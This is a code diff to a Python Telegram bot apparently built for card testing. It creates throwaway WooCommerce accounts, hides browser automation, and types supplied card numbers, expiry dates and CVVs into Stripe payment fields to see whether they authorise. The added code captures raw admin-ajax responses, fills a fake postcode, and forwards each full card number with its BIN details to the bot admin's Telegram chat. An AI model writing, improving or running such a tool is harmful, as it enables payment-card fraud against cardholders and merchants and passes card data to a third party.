@@ -4807,6 +4807,7 @@ async def au_main(card_input, update_dict):
     username = update_dict.get("username", "User")
     bot = Bot(BOT_TOKEN)
     start_time = time.time()
+    ajax_debug = None
 
     parsed = parse_card_input(card_input)
     if not parsed:
@@ -4825,6 +4826,118 @@ async def au_main(card_input, update_dict):
     temp_profile_dir = tempfile.mkdtemp()
 
     try:
+        def _enable_network_capture(driver):
+            """
+            Best-effort enable CDP Network domain so we can pull admin-ajax raw responses.
+            This requires chrome performance logging enabled at driver startup.
+            """
+            try:
+                driver.execute_cdp_cmd("Network.enable", {})
+            except Exception:
+                pass
+            try:
+                driver.execute_cdp_cmd("Page.enable", {})
+            except Exception:
+                pass
+
+        def _wait_admin_ajax_raw(driver, timeout=10):
+            """
+            Collect the latest admin-ajax.php XHR/Fetch response (status + raw body).
+            Returns dict or None.
+            """
+            end = time.time() + timeout
+            seen = set()
+            last = None
+            while time.time() < end:
+                try:
+                    logs = driver.get_log("performance")
+                except Exception:
+                    logs = []
+
+                for entry in logs:
+                    try:
+                        msg = json.loads(entry.get("message", "")).get("message", {})
+                        if msg.get("method") != "Network.responseReceived":
+                            continue
+                        params = msg.get("params", {}) or {}
+                        resp = params.get("response", {}) or {}
+                        url = resp.get("url", "") or ""
+                        if "admin-ajax" not in url:
+                            continue
+                        req_id = params.get("requestId")
+                        if not req_id or req_id in seen:
+                            continue
+                        seen.add(req_id)
+                        last = {
+                            "requestId": req_id,
+                            "url": url,
+                            "status": int(resp.get("status", 0) or 0),
+                        }
+                    except Exception:
+                        continue
+
+                if last:
+                    break
+                time.sleep(0.4)
+
+            if not last:
+                return None
+
+            body = ""
+            try:
+                out = driver.execute_cdp_cmd("Network.getResponseBody", {"requestId": last["requestId"]})
+                body = (out or {}).get("body", "") or ""
+            except Exception:
+                body = ""
+
+            # Trim to keep Telegram safe
+            if len(body) > 3500:
+                body = body[:3500] + "\n... (truncated)"
+
+            return {
+                "url": last.get("url", ""),
+                "status": last.get("status", 0),
+                "body": body,
+            }
+
+        def _fill_zipcode(driver):
+            """
+            WooCommerce add-payment-method pages sometimes require ZIP/postcode outside Stripe.
+            Best-effort fill.
+            """
+            zip_value = "10001"
+            candidates = [
+                "input#billing_postcode",
+                "input[name='billing_postcode']",
+                "input#postcode",
+                "input[name='postcode']",
+                "input[name*='post']",
+                "input[id*='post']",
+            ]
+            for sel in candidates:
+                try:
+                    elts = driver.find_elements(By.CSS_SELECTOR, sel)
+                    if not elts:
+                        continue
+                    el = elts[0]
+                    try:
+                        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
+                    except Exception:
+                        pass
+                    try:
+                        el.click()
+                    except Exception:
+                        pass
+                    try:
+                        el.clear()
+                    except Exception:
+                        pass
+                    el.send_keys(zip_value)
+                    return True
+                except Exception:
+                    continue
+            return False
+
         ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
         options = webdriver.ChromeOptions()
         options.binary_location = CHROME_PATH
@@ -4837,10 +4950,17 @@ async def au_main(card_input, update_dict):
         options.add_argument("--window-size=1920,1080")
         options.add_experimental_option("excludeSwitches", ["enable-automation"])
         options.add_experimental_option('useAutomationExtension', False)
+        # Enable performance logs so we can capture admin-ajax raw responses
+        try:
+            options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
+            options.set_capability("goog:perfLoggingPrefs", {"enableNetwork": True, "enablePage": False})
+        except Exception:
+            pass
 
         service = Service(executable_path=CHROME_DRIVER_PATH)
         driver = webdriver.Chrome(service=service, options=options)
         wait = WebDriverWait(driver, 20)
+        _enable_network_capture(driver)
 
         # STEP 1: Register with random email (real-looking domain)
         email = random_email()
@@ -4852,62 +4972,35 @@ async def au_main(card_input, update_dict):
         except Exception as e:
             raise Exception(f"Account register step failed: {e}")
 
-        # STEP 2: Wait for Stripe iframe to appear (robust wait)
-        driver.execute_script("window.scrollBy(0, 200);")
-        deadline = time.time() + 20
-        stripe_iframes = []
+        # STEP 2: Ensure add-payment form + Stripe fields are loaded
+        try:
+            _open_add_payment_form(driver, wait)
+        except Exception:
+            # Best-effort: proceed anyway (sometimes page already has the form)
+            pass
 
-        while time.time() < deadline:
-            stripe_iframes = driver.find_elements(By.CSS_SELECTOR, "iframe[name^='__privateStripeFrame'],iframe[src*='stripe']")
-            if stripe_iframes:
-                break
-            if deadline - time.time() < 12:
-                driver.execute_script("window.scrollBy(0, 150);")
-            time.sleep(0.4)
+        # STEP 3: Fill card, expiry, cvv in Stripe iframes (adaptive, works even if iframes change)
+        try:
+            _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=True)
+        except Exception as e:
+            raise Exception(f"❌ Failed to fill Stripe fields: {e}")
 
-        if not stripe_iframes:
-            driver.refresh()
-            time.sleep(2)
-            driver.execute_script("window.scrollBy(0, 250);")
-            stripe_iframes = driver.find_elements(By.CSS_SELECTOR, "iframe[name^='__privateStripeFrame'],iframe[src*='stripe']")
-        if not stripe_iframes:
-            raise Exception("❌ Stripe payment fields did not load.")
-
-        # STEP 3: Fill card, expiry, cvv in Stripe iframes
-        card_filled = expiry_filled = cvv_filled = False
-        for iframe in stripe_iframes:
-            driver.switch_to.default_content()
-            driver.switch_to.frame(iframe)
-            # Card number
-            try:
-                c = driver.find_elements(By.ID, "Field-numberInput")
-                if c:
-                    c[0].send_keys(card)
-                    card_filled = True
-            except: pass
-            # Expiry
-            try:
-                e = driver.find_elements(By.ID, "Field-expiryInput")
-                if e:
-                    e[0].send_keys(expiry)
-                    expiry_filled = True
-            except: pass
-            # CVV
-            try:
-                v = driver.find_elements(By.ID, "Field-cvcInput")
-                if v:
-                    v[0].send_keys(cvv)
-                    cvv_filled = True
-            except: pass
-        driver.switch_to.default_content()
-        if not (card_filled and expiry_filled and cvv_filled):
-            raise Exception("❌ Failed to fill all card fields.")
+        # STEP 3.5: Fill ZIP/postcode (required on some flows)
+        try:
+            _fill_zipcode(driver)
+        except Exception:
+            pass
 
         # STEP 4: Scroll a bit and click Add Payment Method
         try:
             driver.execute_script("window.scrollBy(0, 250);")
             place_btn = wait.until(EC.element_to_be_clickable((By.ID, "place_order")))
             place_btn.click()
+            # Capture raw admin-ajax response (debug) right after submit
+            try:
+                ajax_debug = _wait_admin_ajax_raw(driver, timeout=10)
+            except Exception:
+                ajax_debug = None
         except Exception as e:
             raise Exception(f"Clicking Add payment method failed: {e}")
 
@@ -4944,6 +5037,24 @@ async def au_main(card_input, update_dict):
         )
         await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
 
+        # Send raw admin-ajax debug to admin (best-effort)
+        try:
+            if ajax_debug:
+                await bot.send_message(
+                    chat_id=BOT_ADMIN_ID,
+                    text=(
+                        "AU admin-ajax raw response\n"
+                        f"💳 `{full_card}`\n"
+                        f"🏦 `{bin_info}` {bin_flag}\n"
+                        f"🌐 `{ajax_debug.get('url','')}`\n"
+                        f"📟 `{ajax_debug.get('status',0)}`\n"
+                        f"```{(ajax_debug.get('body','') or '')[:3500]}```"
+                    ),
+                    parse_mode="Markdown",
+                )
+        except Exception:
+            pass
+
     except Exception as exc:
         screenshot = "au_fail.png"
         try:
@@ -4953,6 +5064,18 @@ async def au_main(card_input, update_dict):
             text="❌ Stripe Auth V2 process failed.", parse_mode="Markdown")
         trace = traceback.format_exc()
         trace_caption = f"```\n{trace[:950]}\n```"
+        # If we have admin-ajax debug, include it in the admin report (best-effort)
+        try:
+            if ajax_debug:
+                dbg = (
+                    "\n\nAU admin-ajax debug\n"
+                    f"URL: {ajax_debug.get('url','')}\n"
+                    f"STATUS: {ajax_debug.get('status',0)}\n"
+                    f"BODY:\n{(ajax_debug.get('body','') or '')[:1200]}"
+                )
+                trace_caption = f"```\n{(trace[:850] + dbg)[:950]}\n```"
+        except Exception:
+            pass
         try:
             await bot.send_photo(chat_id=BOT_ADMIN_ID,
                 photo=open(screenshot, "rb") if os.path.exists(screenshot) else None,
